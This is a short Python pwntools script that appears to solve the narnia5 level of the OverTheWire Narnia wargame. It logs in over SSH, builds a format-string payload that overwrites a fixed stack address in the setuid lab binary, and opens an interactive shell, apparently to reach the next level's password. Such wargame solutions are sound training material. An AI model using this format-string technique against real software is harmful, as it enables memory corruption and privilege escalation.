#!/usr/bin/env python2
from __future__ import print_function
import pwn
import re
import getpass
import sys
import struct

# Configuration variables
config = {
        'user': 'narnia5',
        'executable': '/narnia/narnia5',
        'password_file_path': '/etc/narnia_pass/narnia6',
        'host': 'narnia.labs.overthewire.org',
        'port': 2226
        }
pwn.context.arch = 'i386'
pwn.context.os = 'linux'

# Get password for SSH login
try:
    password = getpass.getpass(prompt='{} password: '.format(config['user']))
except Exception as e:
    print('[-] Error getting password: ' + e)
    sys.exit(-1)

# Login to SSH
s = pwn.tubes.ssh.ssh(host=config['host'],
                      port=config['port'],
                      user=config['user'],
                      password=password)



# i should be at 0xffffde40
format_string = pwn.fmtstr_payload(1, {0xffffde40: 500}, write_size='int')

print('exploit: {}'.format(repr(format_string)))

p = s.process(argv=[config['executable'], format_string],
              raw=True,
              env={})
p.interactive()

p.close()
s.close()
